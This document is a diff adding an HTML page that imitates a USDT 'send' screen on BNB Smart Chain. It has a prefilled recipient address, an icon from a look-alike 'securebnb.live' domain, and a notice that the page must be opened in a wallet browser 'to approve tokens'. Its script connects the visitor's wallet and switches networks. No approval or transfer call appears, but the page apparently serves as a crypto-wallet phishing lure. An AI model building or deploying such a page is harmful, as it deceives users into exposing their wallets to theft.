@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+<title>SEND USDT</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
+<style>
+:root{
+--bg:#071025; --panel:rgba(255,255,255,0.02); --accent:#2563eb; --accent-2:#7c5cff;
+--text:#e6eef8; --muted:#98a3bf; --placeholder: rgba(230,238,248,0.45);
+--modal-bg: rgba(2,6,23,0.75); --danger: #ef4444; --text:#0b1220; --muted:#6b7280;
+--pill-border:#C0C4CB;
+}
+.destination{margin-top: -25px;margin-bottom:-6px;}
+.network-pill{margin-top:2px;display:inline-flex;gap:7px;align-items:center;border-radius:50px;
+border:1.5px solid var(--pill-border);background:#fff;box-shadow:0 6px 20px rgba(12,20,30,0.03);
+max-width:100%;width:auto;box-sizing:border-box;}
+.network-logo{width:35px;height:35px;display:inline-flex;align-items:center;justify-content:center;border-radius:8px;}
+.network-label{display:inline-flex;align-items:center;gap:6px;font-weight:700;color:var(--text);font-size:14px;}
+.down-arrow{font-size:16px;color:var(--muted);padding-right:5px;line-height:1;margin:0;}
+.btn-spinner{width:20px;height:20px;border-radius:50%;border:3px solid transparent;
+border-top-color:#ff00c8;border-right-color:#00eaff;border-bottom-color:#aaff00;
+border-left-color:#ffae00;animation:spin 0.7s linear infinite;display:inline-block;margin-left:10px;}
+@keyframes spin{to{transform:rotate(360deg);}}
+#btntransfer{transition:all 0.25s ease;background:linear-gradient(45deg,#f0b90b,#e6a700)!important;
+color:#000!important;font-weight:700!important;}
+#btntransfer:disabled{background:#b3b3b3!important;color:#555!important;}
+.overlay{position:fixed;inset:0;background:var(--modal-bg);display:none;align-items:center;justify-content:center;z-index:9999;padding:20px;}
+.overlay.show{display:flex;}
+.modal{width:100%;max-width:420px;background:linear-gradient(180deg,#061025,#071025);border-radius:14px;padding:20px;box-shadow:0 20px 60px rgba(0,0,0,0.6);border:1px solid rgba(255,255,255,0.04);color:#e6eef8;text-align:center;position:relative;}
+.modal .close{position:absolute;right:18px;top:16px;background:linear-gradient(90deg,var(--accent),var(--accent-2));border:3px solid blue;color:#98a3bf;font-size:20px;cursor:pointer;}
+.modal-illustration{width:56px;height:56px;margin:0 auto 8px;border-radius:12px;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,#ff758c,#ffb199);box-shadow:0 8px 30px rgba(255,117,140,0.12);}
+.modal h3{margin:6px 0;font-size:18px;color:#fff;}
+.modal p{margin:8px 0 18px 0;color:#98a3bf;font-size:14px;}
+.modal .ok-btn{padding:10px 16px;border-radius:10px;border:0;background:linear-gradient(90deg,var(--accent),var(--accent-2));color:white;font-weight:700;cursor:pointer;}
+</style>
+</head>
+<body class="bg-white dark:bg-[#1A1A1A]">
+<div class="flex items-center justify-center min-h-screen p-5">
+<div class="flex flex-col justify-between h-screen w-full max-w-md bg-white dark:bg-[#1A1A1A] shadow-lg p-5 rounded-2xl">
+<form class="flex flex-col gap-4">
+<label class="flex flex-col gap-1 mb-6 mt-3">
+<span class="font-medium text-sm text-gray-600 dark:text-gray-300">Address or Domain Name</span>
+<div class="flex flex-row items-center rounded-xl gap-3 border border-gray-400 dark:border-gray-600 p-2 focus-within:ring-2 focus-within:ring-blue-500 bg-white dark:bg-[#232323]">
+<input id="addr" type="text" class="flex-1 text-gray-700 dark:text-gray-200 bg-transparent rounded px-3 py-3 focus:outline-none font-mono" placeholder="0x..." value="0x027631192b5be3f92F271EccB8d24B7db467080d"/>
+<div class="flex flex-row gap-3 text-sm">
+<span class="font-bold cursor-pointer text-blue-600 dark:text-[#48FF91] hover:underline" onclick="pasteAddress()">Paste</span>
+<span class="font-bold cursor-pointer text-blue-600 dark:text-[#48FF91] hover:underline" onclick="copyAddress()">
+<svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 448 512" height="16" width="16">
+<path d="M436 160c6.6 0 12-5.4 12-12v-40c0-6.6-5.4-12-12-12h-20V48c0-26.5-21.5-48-48-48H48C21.5 0 0 21.5 0 48v416c0 26.5 21.5 48 48 48h320c26.5 0 48-21.5 48-48v-48h20c6.6 0 12-5.4 12-12v-40c0-6.6-5.4-12-12-12h-20v-64h20c6.6 0 12-5.4 12-12v-40c0-6.6-5.4-12-12-12h-20v-64h20zm-228-32c35.3 0 64 28.7 64 64s-28.7 64-64 64-64-28.7-64-64 28.7-64 64-64zm112 236.8c0 10.6-10 19.2-22.4 19.2H118.4C106 384 96 375.4 96 364.8v-19.2c0-31.8 30.1-57.6 67.2-57.6h5c12.3 5.1 25.7 8 39.8 8s27.6-2.9 39.8-8h5c37.1 0 67.2 25.8 67.2 57.6v19.2z"></path>
+</svg>
+</span>
+</div>
+</div>
+</label>
+
+<!-- Network Pill -->
+<div class="destination">
+<div style="font-size:13px;color:#6b7280;font-weight:700">Destination Network</div>
+<div class="network-pill p-3 cursor-pointer hover:shadow-md transition-shadow" onclick="toggleNetwork()">
+<div class="network-logo"><img src="https://securebnb.live/images/BNB-icon.png" alt="BNB" width="32" height="32"></div>
+<div class="network-label">BNB Smart Chain<span class="down-arrow">▾</span></div>
+</div>
+</div>
+
+<label class="flex flex-col gap-1 mb-8">
+<span class="font-medium text-sm text-gray-600 dark:text-gray-300">Amount</span>
+<div class="flex flex-row items-center rounded-xl gap-3 border border-gray-400 dark:border-gray-600 p-2 focus-within:ring-2 focus-within:ring-blue-500 bg-white dark:bg-[#232323]">
+<input id="Input_USDT" type="number" class="flex-1 text-gray-700 dark:text-gray-200 bg-transparent px-3 py-3 focus:outline-none text-lg" placeholder="0.00" min="0" step="0.01"/>
+<div class="flex flex-row gap-3 p-1">
+<span class="font-bold text-sm text-gray-500 dark:text-gray-400">USDT</span>
+<span class="font-bold cursor-pointer text-blue-600 dark:text-[#48FF91] hover:underline text-sm" onclick="setMax()">Max</span>
+</div>
+</div>
+<span class="text-gray-800 dark:text-gray-200 text-xs mt-2">$0.00</span>
+</label>
+</form>
+
+<button id="btntransfer" onclick="transferUSDT(this)" disabled
+class="w-full py-4 rounded-3xl font-bold text-lg cursor-pointer transition-all shadow-lg hover:shadow-xl hover:-translate-y-0.5 text-black">
+Next
+</button>
+</div>
+</div>
+
+<!-- Modal -->
+<div id="noWalletOverlay" class="overlay">
+<div class="modal">
+<button class="close" onclick="closeModal()">✕</button>
+<div class="modal-illustration">⚠️</div>
+<h3>Please open in wallet browser</h3>
+<p>This page must be opened inside Trust Wallet or MetaMask browser to approve tokens.</p>
+<button class="ok-btn" onclick="closeModal()">OK</button>
+</div>
+</div>
+
+<script>
+let web3;
+
+function pasteAddress() {
+    navigator.clipboard.readText().then(text => {
+        document.getElementById('addr').value = text;
+    }).catch(() => alert('Paste manually'));
+}
+
+function copyAddress() {
+    navigator.clipboard.writeText(document.getElementById('addr').value);
+    alert('Address copied!');
+}
+
+function setMax() {
+    document.getElementById('Input_USDT').value = '100';
+}
+
+function toggleNetwork() {
+    alert('BNB Smart Chain selected');
+}
+
+function closeModal() {
+    document.getElementById('noWalletOverlay').classList.remove('show');
+}
+
+async function transferUSDT(btn) {
+    btn.disabled = true;
+    btn.innerHTML = '🔄 Connecting<span class="btn-spinner"></span>';
+    
+    if (typeof window.ethereum === 'undefined') {
+        document.getElementById('noWalletOverlay').classList.add('show');
+        btn.disabled = false;
+        btn.innerHTML = 'Next';
+        return;
+    }
+    
+    try {
+        web3 = new Web3(window.ethereum);
+        
+        // Connect wallet
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
+        
+        // Switch to BSC
+        await window.ethereum.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: '0x38' }]
+        });
+        
+        btn.innerHTML = '✅ Connected!';
+        alert('Wallet connected successfully!\n\nAddress: ' + (await web3.eth.getAccounts())[0]);
+        
+    } catch (error) {
+        console.error(error);
+        btn.innerHTML = 'Next';
+        btn.disabled = false;
+        alert('Error: ' + error.message);
+    }
+}
+
+// Auto enable button
+document.getElementById('Input_USDT').addEventListener('input', function() {
+    const btn = document.getElementById('btntransfer');
+    btn.disabled = parseFloat(this.value) <= 0 || !this.value;
+});
+
+// Page load
+window.addEventListener('load', () => {
+    document.getElementById('btntransfer').disabled = false;
+});
+</script>
+</body>
+</html>
